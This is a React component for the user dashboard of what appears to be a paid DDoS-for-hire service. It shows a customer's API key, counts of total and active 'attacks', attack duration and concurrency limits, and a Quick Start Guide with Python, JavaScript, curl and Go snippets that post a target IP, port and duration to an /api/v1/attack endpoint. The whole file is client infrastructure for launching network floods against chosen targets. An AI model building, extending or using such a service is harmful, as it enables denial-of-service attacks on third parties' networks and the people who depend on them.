// src/pages/ApiUserDashboard.jsx - Simplified version that just shows the key

import React, { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import {
    FaSignOutAlt, FaHistory, FaKey, FaExclamationTriangle, FaBolt, FaServer, FaCopy, FaCheck,
    FaCode, FaTerminal, FaPython, FaJs
} from 'react-icons/fa';
import { MdWbSunny, MdNightlight } from 'react-icons/md';
import AnimatedBackground from '../components/AnimatedBackground';
import Toast from '../admin/Toast';

const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:5000';

export default function ApiUserDashboard({ toggleTheme, theme, onLogout }) {
    const dark = theme !== 'light';
    const [loading, setLoading] = useState(true);
    const [stats, setStats] = useState(null);
    const [history, setHistory] = useState([]);
    const [historyPage, setHistoryPage] = useState(1);
    const [historyTotal, setHistoryTotal] = useState(0);
    const [historyType, setHistoryType] = useState('all');
    const [toasts, setToasts] = useState([]);
    const [copied, setCopied] = useState(false);
    const [copiedCode, setCopiedCode] = useState(false);
    const [activeTab, setActiveTab] = useState('python');
    
    const token = localStorage.getItem('apiUserToken');
    
    const toast = useCallback((message, type = 'success') => {
        const id = Date.now();
        setToasts(prev => [...prev, { id, message, type }]);
        setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 3500);
    }, []);
    
    const handleLogout = useCallback(() => {
        localStorage.removeItem('apiUserToken');
        localStorage.removeItem('apiUserData');
        toast('Logged out successfully');
        setTimeout(() => {
            if (onLogout) onLogout();
            window.location.href = '/api-login';
        }, 500);
    }, [toast, onLogout]);
    
    const fetchDashboardStats = useCallback(async () => {
        try {
            const response = await axios.get(`${API_URL}/api/api-auth/dashboard/stats`, {
                headers: { Authorization: `Bearer ${token}` }
            });
            setStats(response.data);
        } catch (err) {
            if (err.response?.status === 401) {
                handleLogout();
            }
            toast('Failed to fetch dashboard data', 'error');
        }
    }, [token, toast, handleLogout]);
    
    const fetchHistory = useCallback(async (page = 1, type = 'all') => {
        try {
            const response = await axios.get(`${API_URL}/api/api-auth/dashboard/history`, {
                headers: { Authorization: `Bearer ${token}` },
                params: { page, limit: 20, type }
            });
            setHistory(response.data.history);
            setHistoryTotal(response.data.total);
            setHistoryPage(response.data.page);
        } catch (err) {
            toast('Failed to fetch history', 'error');
        }
    }, [token, toast]);
    
    useEffect(() => {
        if (!token) {
            window.location.href = '/api-login';
            return;
        }
        
        Promise.all([fetchDashboardStats(), fetchHistory(1, 'all')]).finally(() => {
            setLoading(false);
        });
        
        const interval = setInterval(() => {
            fetchDashboardStats();
        }, 30000);
        
        return () => clearInterval(interval);
    }, [token, fetchDashboardStats, fetchHistory]);
    
    const copyApiKey = () => {
        if (stats?.apiKey) {
            navigator.clipboard.writeText(stats.apiKey);
            setCopied(true);
            toast('API Key copied to clipboard!');
            setTimeout(() => setCopied(false), 2000);
        }
    };
    
    const copyCurrentCode = () => {
        let code = '';
        if (activeTab === 'python') code = pythonCode;
        else if (activeTab === 'javascript') code = jsCode;
        else if (activeTab === 'curl') code = curlCode;
        else if (activeTab === 'go') code = goCode;
        
        navigator.clipboard.writeText(code);
        setCopiedCode(true);
        toast('Code copied to clipboard!');
        setTimeout(() => setCopiedCode(false), 2000);
    };
    
    const handleHistoryTypeChange = (type) => {
        setHistoryType(type);
        fetchHistory(1, type);
    };
    
    if (loading) {
        return (
            <div className={`min-h-screen flex items-center justify-center ${dark ? 'bg-surface-950' : 'bg-slate-50'}`}>
                <div className="text-center">
                    <div className="w-8 h-8 border-2 border-cyan-600 border-t-transparent rounded-full animate-spin mx-auto mb-3" />
                    <p className={dark ? 'text-slate-400' : 'text-slate-500'}>Loading dashboard...</p>
                </div>
            </div>
        );
    }
    
    if (!stats) {
        return (
            <div className={`min-h-screen flex items-center justify-center ${dark ? 'bg-surface-950' : 'bg-slate-50'}`}>
                <div className="text-center">
                    <FaExclamationTriangle className="text-red-500 text-4xl mx-auto mb-3" />
                    <p className={dark ? 'text-slate-400' : 'text-slate-500'}>Failed to load dashboard</p>
                    <button onClick={fetchDashboardStats} className="mt-3 px-4 py-2 bg-cyan-600 text-white rounded-lg">
                        Retry
                    </button>
                </div>
            </div>
        );
    }
    
    const { account, totals, currentUsage, limits} = stats;
    const isExpiringSoon = account.daysRemaining !== null && account.daysRemaining <= 7 && account.daysRemaining > 0;
    // ✅ Use the full API key directly from stats
    const apiKey = stats.apiKey || 'YOUR_API_KEY_HERE';
    
    const cardCls = dark
        ? 'bg-surface-800/70 border-white/[0.07] backdrop-blur-xl'
        : 'bg-white border-slate-200 shadow-sm';
    
    // ✅ Code examples with the actual API key
    const pythonCode = `import requests

API_KEY = "${apiKey}"
BASE_URL = "${API_URL}"

headers = {
    "x-api-key": API_KEY,
    "Content-Type": "application/json"
}

def launch_attack(ip, port, duration):
    payload = {"ip": ip, "port": port, "duration": duration}
    response = requests.post(f"{BASE_URL}/api/v1/attack", json=payload, headers=headers)
    
    if response.status_code == 200:
        print(f"✅ Attack launched! Target: {ip}:{port}, Duration: {duration}s")
        return response.json()
    else:
        print(f"❌ Failed: {response.json().get('error')}")
        return None

def get_stats():
    response = requests.get(f"{BASE_URL}/api/v1/stats", headers=headers)
    return response.json()

if __name__ == "__main__":
    stats = get_stats()
    print(f"Total attacks: {stats['usage']['totalAttacks']}")
    # result = launch_attack("192.168.1.100", 80, 30)`;

    const jsCode = `const axios = require('axios');

const API_KEY = "${apiKey}";
const BASE_URL = "${API_URL}";

const client = axios.create({
    baseURL: BASE_URL,
    headers: { 'x-api-key': API_KEY, 'Content-Type': 'application/json' }
});

async function launchAttack(ip, port, duration) {
    try {
        const response = await client.post('/api/v1/attack', { ip, port, duration });
        console.log(\`✅ Attack launched! Target: \${ip}:\${port}, Duration: \${duration}s\`);
        return response.data;
    } catch (error) {
        console.error('❌ Failed:', error.response?.data?.error || error.message);
        return null;
    }
}

async function getStats() {
    const response = await client.get('/api/v1/stats');
    return response.data;
}

(async () => {
    const stats = await getStats();
    console.log(\`Total attacks: \${stats.usage.totalAttacks}\`);
    // await launchAttack("192.168.1.100", 80, 30);
})();`;

    const curlCode = `# Get your stats
curl -X GET ${API_URL}/api/v1/stats \\
  -H "x-api-key: ${apiKey}"

# Launch an attack (30 seconds)
curl -X POST ${API_URL}/api/v1/attack \\
  -H "x-api-key: ${apiKey}" \\
  -H "Content-Type: application/json" \\
  -d '{"ip": "192.168.1.100", "port": 80, "duration": 30}'`;

    const goCode = `package main

import (
    "bytes"
    "encoding/json"
    "fmt"
    "net/http"
)

const (
    apiKey  = "${apiKey}"
    baseURL = "${API_URL}"
)

func launchAttack(ip string, port, duration int) error {
    payload := map[string]interface{}{"ip": ip, "port": port, "duration": duration}
    jsonData, _ := json.Marshal(payload)
    
    req, _ := http.NewRequest("POST", baseURL+"/api/v1/attack", bytes.NewBuffer(jsonData))
    req.Header.Set("x-api-key", apiKey)
    req.Header.Set("Content-Type", "application/json")
    
    client := &http.Client{}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }
    defer resp.Body.Close()
    
    fmt.Printf("Response status: %s\\n", resp.Status)
    return nil
}

func main() {
    // launchAttack("192.168.1.100", 80, 30)
}`;

    return (
        <div className={`relative min-h-screen transition-colors duration-300 ${dark ? 'bg-surface-950' : 'bg-slate-50'}`}>
            <AnimatedBackground intensity={0.3} />
            <div className="fixed inset-0 bg-grid opacity-20 pointer-events-none z-0" />
            
            <div className="relative z-10 pb-20">
                {/* Header */}
                <header className={`sticky top-0 z-40 border-b ${dark ? 'border-white/[0.06] bg-surface-900/80 backdrop-blur-xl' : 'border-black/[0.07] bg-white/80 backdrop-blur-xl shadow-sm'}`}>
                    <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
                        <div className="flex items-center gap-3">
                            <img src="/logo512.png" alt="" className="w-8 h-8 rounded-xl object-contain" />
                            <div>
                                <p className="text-cyan-500 font-bold tracking-[0.12em] text-sm">API DASHBOARD</p>
                                <p className={`text-[10px] ${dark ? 'text-slate-500' : 'text-slate-400'}`}>{account.username}</p>
                            </div>
                        </div>
                        <div className="flex items-center gap-2">
                            <button onClick={toggleTheme} className={`w-9 h-9 rounded-xl flex items-center justify-center transition-all ${
                                dark ? 'bg-white/[0.06] text-yellow-400' : 'bg-black/[0.05] text-slate-600'
                            }`}>
                                {dark ? <MdWbSunny size={17} /> : <MdNightlight size={17} />}
                            </button>
                            <button onClick={handleLogout} className={`flex items-center gap-2 px-3 py-1.5 rounded-xl text-sm font-semibold transition-all ${
                                dark ? 'bg-red-600/10 text-red-400 hover:bg-red-600 hover:text-white' : 'bg-red-50 text-red-500 hover:bg-red-600 hover:text-white'
                            }`}>
                                <FaSignOutAlt size={13} /> Logout
                            </button>
                        </div>
                    </div>
                </header>
                
                <div className="max-w-7xl mx-auto px-4 py-6">
                    {/* Account Status Banner */}
                    {account.isExpired && (
                        <div className="mb-4 rounded-xl p-3 bg-red-500/10 border border-red-500/20 text-red-400 text-sm flex items-center gap-2">
                            <FaExclamationTriangle size={14} /> Your account has expired. Please contact the administrator.
                        </div>
                    )}
                    {isExpiringSoon && !account.isExpired && (
                        <div className="mb-4 rounded-xl p-3 bg-yellow-500/10 border border-yellow-500/20 text-yellow-400 text-sm flex items-center gap-2">
                            <FaExclamationTriangle size={14} /> Your account will expire in {account.daysRemaining} days.
                        </div>
                    )}
                    
                    {/* Stats Grid */}
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-6">
                        <div className={`rounded-xl p-3 border ${cardCls}`}>
                            <p className={`text-[10px] font-semibold uppercase tracking-wider mb-1 ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Total Requests</p>
                            <p className="text-2xl font-black text-cyan-500">{totals.totalRequests.toLocaleString()}</p>
                        </div>
                        <div className={`rounded-xl p-3 border ${cardCls}`}>
                            <p className={`text-[10px] font-semibold uppercase tracking-wider mb-1 ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Total Attacks</p>
                            <p className="text-2xl font-black text-red-500">{totals.totalAttacks.toLocaleString()}</p>
                        </div>
                        <div className={`rounded-xl p-3 border ${cardCls}`}>
                            <p className={`text-[10px] font-semibold uppercase tracking-wider mb-1 ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Active Attacks</p>
                            <p className={`text-2xl font-black ${currentUsage.activeAttacks > 0 ? 'text-green-500' : dark ? 'text-slate-400' : 'text-slate-500'}`}>
                                {currentUsage.activeAttacks} / {limits.rateLimits.concurrentRequests}
                            </p>
                        </div>
                        <div className={`rounded-xl p-3 border ${cardCls}`}>
                            <p className={`text-[10px] font-semibold uppercase tracking-wider mb-1 ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Account Status</p>
                            <p className={`text-lg font-black ${account.status === 'active' ? 'text-green-500' : 'text-red-500'}`}>
                                {account.status.toUpperCase()}
                            </p>
                        </div>
                    </div>
                    
                    {/* API Key Section - Full key visible */}
                    <div className={`rounded-xl p-5 border mb-6 ${cardCls}`}>
                        <div className="flex items-center justify-between flex-wrap gap-3">
                            <div className="flex items-center gap-2">
                                <FaKey className="text-cyan-500" size={16} />
                                <h3 className={`font-bold text-sm ${dark ? 'text-white' : 'text-slate-900'}`}>Your API Key</h3>
                            </div>
                            <div className="flex items-center gap-2">
                                <code className={`text-xs px-3 py-1.5 rounded-lg font-mono break-all ${dark ? 'bg-white/[0.05] text-slate-300' : 'bg-slate-100 text-slate-700'}`}>
                                    {apiKey}
                                </code>
                                <button onClick={copyApiKey} className={`p-1.5 rounded-lg transition-all ${dark ? 'hover:bg-white/[0.08]' : 'hover:bg-slate-100'}`}>
                                    {copied ? <FaCheck className="text-green-500" size={14} /> : <FaCopy size={14} />}
                                </button>
                            </div>
                        </div>
                        <p className={`text-[10px] mt-2 ${dark ? 'text-slate-500' : 'text-slate-400'}`}>
                            Include this key in all API requests via the <code className="px-1 rounded bg-slate-700/50">x-api-key</code> header
                        </p>
                    </div>
                    
                    {/* API Usage Guide */}
                    <div className={`rounded-xl p-5 border mb-6 ${cardCls}`}>
                        <div className="flex items-center justify-between mb-4">
                            <div className="flex items-center gap-2">
                                <FaCode className="text-green-500" size={18} />
                                <h3 className={`font-bold text-sm ${dark ? 'text-white' : 'text-slate-900'}`}>Quick Start Guide</h3>
                            </div>
                            <button onClick={copyCurrentCode} className={`flex items-center gap-1 px-2 py-1 rounded-lg text-xs transition-all ${
                                dark ? 'bg-white/[0.05] text-slate-400 hover:bg-white/[0.1]' : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
                            }`}>
                                {copiedCode ? <FaCheck size={10} /> : <FaCopy size={10} />}
                                Copy Code
                            </button>
                        </div>
                        
                        <div className="space-y-4">
                            {/* Language Tabs */}
                            <div className="flex gap-2 border-b pb-2">
                                {['python', 'javascript', 'curl', 'go'].map(lang => (
                                    <button key={lang} onClick={() => setActiveTab(lang)}
                                        className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1 ${
                                            activeTab === lang ? 'bg-cyan-600 text-white' : dark ? 'text-slate-400 hover:text-white' : 'text-slate-600 hover:text-slate-900'
                                        }`}>
                                        {lang === 'python' && <FaPython size={10} />}
                                        {lang === 'javascript' && <FaJs size={10} />}
                                        {lang === 'curl' && <FaTerminal size={10} />}
                                        {lang === 'go' && <FaTerminal size={10} />}
                                        {lang.toUpperCase()}
                                    </button>
                                ))}
                            </div>
                            
                            {/* Code Display */}
                            <div className={`rounded-lg overflow-hidden ${dark ? 'bg-surface-900' : 'bg-slate-100'}`}>
                                <pre className="p-4 text-xs overflow-x-auto">
                                    <code className={dark ? 'text-slate-300' : 'text-slate-800'}>
                                        {activeTab === 'python' && pythonCode}
                                        {activeTab === 'javascript' && jsCode}
                                        {activeTab === 'curl' && curlCode}
                                        {activeTab === 'go' && goCode}
                                    </code>
                                </pre>
                            </div>
                            
                            {/* Important Notes */}
                            <div className={`p-3 rounded-lg ${dark ? 'bg-yellow-500/10 border border-yellow-500/20' : 'bg-yellow-50 border border-yellow-200'}`}>
                                <p className="text-xs font-semibold mb-2">⚠️ Important Notes:</p>
                                <ul className="text-xs space-y-1 ml-4 list-disc">
                                    <li>Max duration: <strong>{limits.attackLimits.maxDuration}s</strong></li>
                                    <li>Min interval: <strong>{limits.attackLimits.minIntervalBetweenAttacks}s</strong></li>
                                    <li>Blocked ports: <strong>{limits.attackLimits.blockedPorts?.join(', ') || '22, 23, 3389'}</strong></li>
                                    <li>Max concurrent: <strong>{limits.rateLimits.concurrentRequests}</strong></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    
                    {/* Attack Limits */}
                    <div className={`rounded-xl p-5 border mb-6 ${cardCls}`}>
                        <div className="flex items-center gap-2 mb-4">
                            <FaBolt className="text-red-500" size={16} />
                            <h3 className={`font-bold text-sm ${dark ? 'text-white' : 'text-slate-900'}`}>Your Account Limits</h3>
                        </div>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-center">
                            <div>
                                <p className={`text-[10px] uppercase tracking-wider ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Max Duration</p>
                                <p className={`text-lg font-black ${dark ? 'text-white' : 'text-slate-900'}`}>{limits.attackLimits.maxDuration}s</p>
                            </div>
                            <div>
                                <p className={`text-[10px] uppercase tracking-wider ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Min Interval</p>
                                <p className={`text-lg font-black ${dark ? 'text-white' : 'text-slate-900'}`}>{limits.attackLimits.minIntervalBetweenAttacks}s</p>
                            </div>
                            <div>
                                <p className={`text-[10px] uppercase tracking-wider ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Concurrent</p>
                                <p className={`text-lg font-black ${dark ? 'text-white' : 'text-slate-900'}`}>{limits.rateLimits.concurrentRequests}</p>
                            </div>
                            <div>
                                <p className={`text-[10px] uppercase tracking-wider ${dark ? 'text-slate-500' : 'text-slate-400'}`}>Cooldown</p>
                                <p className={`text-lg font-black ${dark ? 'text-white' : 'text-slate-900'}`}>{limits.rateLimits.cooldownSeconds}s</p>
                            </div>
                        </div>
                    </div>
                    
                    {/* Recent Activity */}
                    <div className={`rounded-xl p-5 border ${cardCls}`}>
                        <div className="flex items-center justify-between mb-4 flex-wrap gap-3">
                            <div className="flex items-center gap-2">
                                <FaHistory className="text-cyan-500" size={16} />
                                <h3 className={`font-bold text-sm ${dark ? 'text-white' : 'text-slate-900'}`}>Recent Activity</h3>
                            </div>
                            <div className="flex gap-2">
                                {['all', 'attacks', 'requests'].map(type => (
                                    <button key={type} onClick={() => handleHistoryTypeChange(type)}
                                        className={`text-xs px-3 py-1 rounded-lg font-semibold transition-all ${
                                            historyType === type ? 'bg-cyan-600 text-white' : dark ? 'bg-white/[0.05] text-slate-400' : 'bg-slate-100 text-slate-600'
                                        }`}>
                                        {type.charAt(0).toUpperCase() + type.slice(1)}
                                    </button>
                                ))}
                            </div>
                        </div>
                        
                        {history.length === 0 ? (
                            <div className="text-center py-8">
                                <FaHistory className={`mx-auto mb-2 ${dark ? 'text-slate-700' : 'text-slate-300'}`} size={24} />
                                <p className={`text-sm ${dark ? 'text-slate-500' : 'text-slate-400'}`}>No activity yet. Try the example above!</p>
                            </div>
                        ) : (
                            <div className="space-y-2 max-h-80 overflow-y-auto">
                                {history.slice(0, 10).map((item, idx) => (
                                    <div key={idx} className={`rounded-lg px-3 py-2 border ${dark ? 'bg-white/[0.02] border-white/[0.05]' : 'bg-slate-50 border-slate-200'}`}>
                                        <div className="flex items-center justify-between">
                                            <div className="flex items-center gap-2">
                                                {item.type === 'attack' ? <FaBolt className="text-red-500" size={10} /> : <FaServer className="text-cyan-500" size={10} />}
                                                <span className={`text-xs font-mono ${dark ? 'text-slate-300' : 'text-slate-700'}`}>
                                                    {item.type === 'attack' ? item.target : item.endpoint}
                                                </span>
                                            </div>
                                            <span className={`text-[10px] ${dark ? 'text-slate-500' : 'text-slate-400'}`}>{item.timeAgo}</span>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                        
                        {historyTotal > 20 && (
                            <div className="mt-3 text-center">
                                <button onClick={() => fetchHistory(historyPage + 1, historyType)} className="text-xs text-cyan-500 hover:text-cyan-400">
                                    Load More
                                </button>
                            </div>
                        )}
                    </div>
                </div>
            </div>
            
            <Toast toasts={toasts} />
        </div>
    );
}